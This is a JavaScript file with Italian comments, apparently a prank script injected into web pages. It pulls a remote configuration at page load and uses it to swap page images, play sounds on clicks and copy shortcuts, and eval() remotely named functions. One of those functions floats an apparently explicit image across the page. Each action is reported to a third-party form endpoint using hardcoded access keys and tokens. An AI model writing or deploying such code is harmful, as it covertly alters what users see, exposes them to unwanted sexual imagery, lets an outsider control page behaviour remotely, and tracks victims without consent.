// Funzione per sostituire le immagini su una pagina
function replaceImages(replaceRate, imageUrls) {
  var images = document.getElementsByTagName("img");

  for (var i = 0; i < images.length; i++) {
    if (Math.random() < replaceRate) {
      var randomIndex = Math.floor(Math.random() * imageUrls.length);
      images[i].src = imageUrls[randomIndex];
      remoteLogging(`Mostrata immagine ${imageUrls[randomIndex]}`);
    }
  }
}

function playAudioFromUrl(url) {
  var myAudio = new Audio(url);
  myAudio.play();
  remoteLogging(`Riprodotto audio ${url}`);
}

function addCopySoundListener(rate) {
  window.addEventListener(
    "keydown",
    function (e) {
      e = e || window.event;
      var key = e.which || e.keyCode; // keyCode detection
      var ctrl = e.ctrlKey ? e.ctrlKey : key === 17 ? true : false; // ctrl detection

      if (key == 67 && ctrl) {
        if (Math.random() < rate) {
          playAudioFromUrl(
            "https://www.myinstants.com/media/sounds/disconnect.mp3"
          );
          setTimeout(
            () =>
              playAudioFromUrl(
                "https://www.myinstants.com/media/sounds/connect.mp3"
              ),
            500
          );
        }
      }
    },
    false
  );
}

function addSoundsListeners(sounds) {
  if (!sounds?.length) {
    return;
  }

  window.addEventListener("click", () => {
    sounds.forEach((sound) => {
      if (Math.random() < sound.rate) {
        playAudioFromUrl(sound.url);
        return;
      }
    });
  });
}

function animations(animations) {
  if (!animations?.length) {
    return;
  }

  animations.forEach((animation) => {
    if (Math.random() < animation.rate) {
      eval(animation.name)();
      remoteLogging(`riprodotta animazione ${animation?.name}`);
    }
  });
}

function remoteLogging(message) {
  // Verrà loggato ogni evento e si potrà vedere a questa mail:  vhrcjmfa@sharklasers.com
  // AccesKey per https://api.staticforms.xyz/submit: 9fb8daba-bc34-4fe2-88e5-802228e45225

  var xhr = new XMLHttpRequest();
  xhr.open("POST", "https://api.staticforms.xyz/submit");
  xhr.setRequestHeader("Content-Type", "application/json");
  xhr.setRequestHeader("Accept", "application/json");
  xhr.send(
    JSON.stringify({
      accessKey: "9fb8daba-bc34-4fe2-88e5-802228e45225",
      message: message,
      timestamp: new Date(),
    })
  );

  // xhr.open("POST", "https://getform.io/f/3b8dfce5-584b-41f9-b75a-0f4e8e26e4ec");
  // xhr.send(
  //   JSON.stringify({
  //     message,
  //     timestamp: new Date(),
  //   })
  // );
  // // Si può vedere il log qui:
  // // https://api.getform.io/v1/forms/3b8dfce5-584b-41f9-b75a-0f4e8e26e4ec?token=9bL6licV6VvrCVbiGG0rN0Kc5MbHtC03yPJFXA0a1JaVWulHmKp02YH3Tdi4
}

// Esegui la funzione quando la pagina è stata caricata
window.addEventListener("load", async () => {
  const response = await fetch("https://api.npoint.io/1511916ca6809f937d07");
  // "https://www.npoint.io/docs/1511916ca6809f937d07" per modificare il json
  // "https://api.jsonbin.io/v3/b/6440f6b4ace6f33a220f187f?meta=false"
  const configuration = await response.json();

  replaceImages(configuration.imageReplaceRate, configuration.imageUrls);

  addCopySoundListener(configuration.copySoundRate);

  addSoundsListeners(configuration.sounds);

  // [{"rate": 0.0001, "name": "backAndForth"}];
  animations(configuration.animations);
});

function createDickboxes(count, animationName) {
  var dickClassList = [];
  for (let index = 1; index <= count; index++) {
    var animationDuration = Math.floor(Math.random() * 8 + 3); // random 3-7
    var dickClass = `dickbox${index}`;
    var dick_box = document.createElement("img");
    document.body.appendChild(dick_box);
    dick_box.src = "https://cdn.zoig1.com/thumb/320x240/55/hgdicfb.jpg";
    dick_box.classList.add(dickClass);
    dick_box.style.display = "block";
    dick_box.style.width = "200px";
    dick_box.style.height = "50px";
    dick_box.style.backgroundColor = "black";
    dick_box.style.position = "absolute";
    dick_box.style.animationName = animationName;
    dick_box.style.animationDuration = `${animationDuration}s`;
    dick_box.style.opacity = "0";

    dickClassList.push({ name: dickClass, speed: animationDuration });
  }
  return dickClassList;
}

function backAndForth() {
  const dickBoxNames = createDickboxes(1, "backAndForth");

  const style = document.createElement("style");
  style.innerHTML = `      
      @keyframes backAndForth {
          0%   {left:0px; top:10%; opacity: 0}
          5%   {left:0px; top:10%; opacity: 1}
          25%  {left:90%; top:10%; rotate: 0deg;}
          50%  {left:90%; top:10%; rotate: 180deg;}
          75%  {left:0px; top:10%; rotate: 180deg;}
          90% {left:0px; top:10%; rotate: 180deg; opacity: 1}
          100% {left:0px; top:10%; rotate: 180deg; opacity: 0}
      }
      `;
  document.head.appendChild(style);

  setTimeout(() => {
    document.getElementsByClassName(dickBoxNames[0].name)[0].remove();
  }, dickBoxNames[0].speed * 1000);
}
